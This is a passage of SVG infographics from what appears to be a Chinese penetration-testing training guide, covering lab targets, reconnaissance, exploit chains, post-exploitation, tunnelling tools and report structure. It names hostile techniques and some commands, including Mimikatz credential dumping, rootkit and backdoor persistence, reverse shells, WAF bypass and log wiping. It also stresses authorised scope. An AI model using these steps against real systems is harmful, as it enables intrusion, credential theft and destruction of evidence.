  <rect x="300" y="236" width="220" height="55" rx="10" fill="#f0f9ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑦ Reporting 报告与修复建议 汇报交付</text>
</svg>

<svg width="800" height="309" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 309">
  <defs><linearGradient id="gvlfvfl70" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="309" rx="12" fill="url(#gvlfvfl70)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#1e3a8a" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🧱 靶场组合训练架构图</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">外围边界层: Nginx WAF CDN 80/443</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">业务层: Web应用 SpringBoot/PHP/Node 8080/9000</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">中间件层: Tomcat/Nginx/Redis/MySQL 7001/3306/6379</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">内网层: AD域/办公机/运维跳板机 192.168段</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">数据层: Elasticsearch/MongoDB/Hadoop 9200</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">管理层: Jenkins/GitLab/Nexus 8080/8081/9090</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">堡垒机/JumpServer: 443 运维入口 优先级P0</text>
</svg>

<svg width="800" height="382" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 382">
  <defs><linearGradient id="gblvj48pt" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="382" rx="12" fill="url(#gblvj48pt)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0369a1" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🗺️ Vulhub 靶机组合推荐 12台</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">① Web入门: dvwa + pikachu + upload-labs (Day1~30)</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">② 注入专项: sqli-labs 75关 (Day20~25)</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">③ Java中级: struts2/s2-045 + thinkphp/5.x-rce + fastjson 1.2.24</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">④ Shiro三件套: shiro 550 + shiro 721 PaddingOracle + Cas反序列化</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑤ 核弹漏洞: log4j2 CVE-2021-44228 + CVE-2021-44832 JDBC</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑥ Weblogic全家桶: 14882 + 2725 + 2555 + 2109</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑦ 框架漏洞: ThinkCMF + ThinkPHP6 + Laravel + SpringBoot Actuator</text>
  <rect x="300" y="236" width="220" height="55" rx="10" fill="#f0f9ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑧ SSRF/XXE: PHP XXE + WebLogic SSRF + gopherus Redis攻击</text>
  <rect x="540" y="236" width="220" height="55" rx="10" fill="#faf5ff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑨ 中间件: Apache解析 + Nginx目录穿越 + Tomcat PUT + IIS6解析</text>
  <rect x="60" y="309" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="341.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑩ 反序列化: PHP phar:// + Java CommonsCollections + .NET ViewState</text>
  <rect x="300" y="309" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="341.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑪ 内网横向: vulhub/ms17-010 + vulhub/redis-unauth + docker-api unauth</text>
  <rect x="540" y="309" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="341.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑫ 综合大靶场: vulhub/vulfocus 集成 一键组合 30+漏洞 连贯演练</text>
</svg>

<svg width="800" height="382" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 382">
  <defs><linearGradient id="g0s7xe6dk" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="382" rx="12" fill="url(#g0s7xe6dk)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0f766e" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🕵️ 阶段①: 信息收集 12件套</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">被动OSINT: theHarvester + subfinder + amass 子域名/邮箱/资产</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">搜索引擎: site:target.com + Github Sensitive + FOFA/Shodan</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Whois/DNS: 注册人/邮箱/NS记录/A记录/CNAME/AXFR尝试</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">端口扫描: Nmap -A -sV + Masscan 全端口 0-65535</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">服务识别: Nmap -sV + banner grab 指纹版本</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">目录扫描: dirsearch/dirbuster/gobuster 字典跑 common+平台专用</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">JS敏感信息: LinkFinder/jsluice/JSFinder 找接口/密钥/内网地址</text>
  <rect x="300" y="236" width="220" height="55" rx="10" fill="#f0f9ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">WAF识别: wafw00f + XSStrike + sqlmap --wizard</text>
  <rect x="540" y="236" width="220" height="55" rx="10" fill="#faf5ff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">CMS指纹: whatweb + cmseek + eHole 识别CMS版本</text>
  <rect x="60" y="309" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="341.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Github信息泄露: gitdorker + GitHub搜索 tokens/passwords/backup</text>
  <rect x="300" y="309" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="341.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">云资产: S3 Bucket 列表 + COS 签名泄露 + 阿里云 ECS Metadata</text>
  <rect x="540" y="309" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="341.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">旁站/C段: Nmap C段扫描 + Shodan/FOFA ip:网段 + WebLogic集群</text>
</svg>

<svg width="800" height="309" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 309">
  <defs><linearGradient id="g0l7v2wdv" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="309" rx="12" fill="url(#g0l7v2wdv)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#92400e" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🧩 阶段②~④: 漏洞分析与验证流程</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">漏洞情报匹配: 服务版本 → 查CVE/NVD/CNNVD → Nuclei批量打</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">低危到高危递进: 先试信息泄露/目录穿越 → SQLi/XSS → RCE级</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">指纹精准匹配: 别用IIS的EXP去打Apache 别乱扫 浪费时间还容易告警</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">漏洞POC三件套: 手工验证1个 → Burp抓包 → 写批量脚本</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">安全意识: 一个漏洞没成? 别放弃 试试变形/WAF绕过/编码双写</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">组合拳思路: Nginx目录穿越读源码 → 源码审计发现SQL → sqlmap跑数据</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">出网探测优先: 所有疑似漏洞 先 DNSLog/${jndi:dns} 盲探 不触发WAF</text>
</svg>

<svg width="800" height="382" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 382">
  <defs><linearGradient id="g6akhtgfy" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="382" rx="12" fill="url(#g6akhtgfy)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#be123c" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">💣 阶段⑤: Exploitation 漏洞利用 组合拳</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">组合拳①: SSRF + Gopherus → Redis未授权 → SSH公钥写入</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">组合拳②: Fastjson → JNDI → 注入内存马 → 哥斯拉上线</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">组合拳③: Log4Shell不出网 → 泄露Spring密码 → JDBC连接库</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">组合拳④: Shiro 550 Key爆破 → 上线CS → 抓取域管Hash</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">组合拳⑤: SQLi 报错注入 → load_file读config → 数据库账号密码 → 提权UDF</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">组合拳⑥: ThinkPHP 5.0.24 RCE → 命令执行 → 写Shell → Docker逃逸</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">组合拳⑦: Weblogic 14882 未授权 → 内存马 → NTLM Relay 拿域控</text>
  <rect x="300" y="236" width="220" height="55" rx="10" fill="#f0f9ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">组合拳⑧: Jenkins未授权脚本控制台 → Groovy RCE → 加Jenkins管理员账号</text>
  <rect x="540" y="236" width="220" height="55" rx="10" fill="#faf5ff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">组合拳⑨: 文件上传 .phar → phar://反序列化 → 任意文件删除+RCE</text>
  <rect x="60" y="309" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="341.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">组合拳⑩: Struts2 S2-045 → OGNL命令执行 → 反弹meterpreter</text>
</svg>

<svg width="800" height="382" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 382">
  <defs><linearGradient id="gcrslzfir" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="382" rx="12" fill="url(#gcrslzfir)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#7c2d12" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🗡️ 阶段⑥: 后渗透 10个必做动作</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">① 权限维持: 加crontab / 启动项 / 用户后门 / SSH公钥 / rootkit / 内存马</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">② 凭据收集: /etc/shadow + Mimikatz sekurlsa::logonpasswords + LaZagne 全浏览器</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">③ 信息收集: ifconfig/ipconfig → 内网网段 / 域信息 / DNS / 共享目录</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">④ 横向移动: CrackMapExec/Impacket smbexec/wmiexec/psexec 批量C段</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑤ 数据库窃取: mysqldump 导出 / impacket mssqlclient / navicat 密码找</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑥ 跳板机: SSH -D 1080 Socks5隧道 / FRP 内网穿透 / EarthWorm 多级跳板</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑦ 漏洞扫描内网: 内网C段 Masscan + Nmap + Vuln 批量 ms17-010/445端口</text>
  <rect x="300" y="236" width="220" height="55" rx="10" fill="#f0f9ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑧ 提权: Linux提权脚本 LinEnum/PEASS / Windows提权 PowerUp</text>
  <rect x="540" y="236" width="220" height="55" rx="10" fill="#faf5ff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑨ 文件窃取: 敏感目录 /backup /config /database / 财务数据 / 源代码</text>
  <rect x="60" y="309" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="341.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑩ 痕迹清理: history -c / 删除/var/log/* / 清理IIS/Apache日志 / 事件日志wevtutil</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gnedqhuor" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gnedqhuor)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#4c1d95" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🛰️ 隧道与内网穿透 5方案</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">方案1: SSH隧道 最稳 → ssh -CfNg -L 3306:127.0.0.1:3306 user@jump</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">方案2: FRP 高性能跨网 → frps(VPS) + frpc(内网靶机) 穿透任意端口</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">方案3: EarthWorm(EW) 多级跳板 → sssocksd + rcsocks 3~5级内网跳转</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">方案4: Chisel HTTP/Socks → 基于HTTP隧道 加密流量 过防火墙</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">方案5: Neo-reGeorg → 基于HTTP正向代理 Webshell型 过严格WAF出口</text>
</svg>

<svg width="800" height="309" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 309">
  <defs><linearGradient id="gy9w3mjnc" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="309" rx="12" fill="url(#gy9w3mjnc)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0f172a" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🧰 综合靶场工具库 Top30</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">侦察: Nmap / Masscan / Amass / Subfinder / Dirsearch / Gobuster / WhatWeb</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">OSINT: theHarvester / Maltego / FOFA / Shodan / ZoomEye / GitDorker</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">漏洞利用: BurpSuitePro / Sqlmap / XSStrike / MSF / Nuclei / Yakit</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">后渗透: Cobalt Strike / Metasploit / Mimikatz / CrackMapExec / Impacket / LaZagne</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">内网: FRP / EarthWorm / Chisel / Neo-reGeorg / Proxychains-ng / Hydra</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">审计: CodeQL / Semgrep / SonarQube / VSCode + 正则搜索漏洞点</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">报告: Dradis / Faraday / CherryTree / POC-T 批量 / AutoSploit</text>
</svg>

<svg width="800" height="309" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 309">
  <defs><linearGradient id="gu2cv7nkb" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="309" rx="12" fill="url(#gu2cv7nkb)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0e7490" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">📝 阶段⑦: 渗透报告7大章节</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">① 执行摘要Executive Summary: 给高管看的300字结论 + 风险矩阵彩图</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">② 范围与授权书: SOW 声明的测试范围/时间/人员/免责声明</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">③ 信息收集结果: 资产清单 + 网络拓扑 + 子域名 + 端口服务表</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">④ 漏洞详情 按CVSS由高到低: 每个漏洞 = 标题+CVSS+复现步骤+截图+修复建议</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑤ 攻击时间线 攻击者视角: 入口点 → 权限提升 → 横向过程 → 最终成果</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑥ 数据泄露/影响评估: 泄露的用户数据/商业机密 量化损失建议</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑦ 修复建议 + 整改优先级: 短期(24小时)/中期(7天)/长期(30天) 三级计划 + 复测时间</text>
</svg>

<svg width="800" height="455" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 455">
  <defs><linearGradient id="g5v8jzfsi" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="455" rx="12" fill="url(#g5v8jzfsi)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#92400e" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">⚠️ 实战避坑指南 15条</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">① 永远先读授权书! 授权范围外的IP 千万别扫 扫到就是犯法</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">② 扫描限速: nmap -T3/T2 别用-T5 不然秒被封 对方IDS/IPS 10秒拉黑</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">③ WAF绕过: 一个payload不行 换编码(URL×2/Unicode/Hex/Base64)、空格变形、Host头绕</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">④ 反弹shell失败: 检查目标出网(telnet VPS 443) / 换端口80/443/53 / 换bash到nc到python</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑤ 提权失败: 先LinEnum/WinPEAS 扫一遍系统 找SUID/计划任务/可写服务/内核漏洞</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑥ 横向被拦: 不用SMB 换WMI/WinRM/PSRemoting 或者打域控MS14-068 / Zerologon</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑦ 内网慢: 开代理后 先扫445/3389/22/6379/8080 高频端口 不要扫全段65535</text>
  <rect x="300" y="236" width="220" height="55" rx="10" fill="#f0f9ff" stroke="#64748b" stroke-width="2"/>
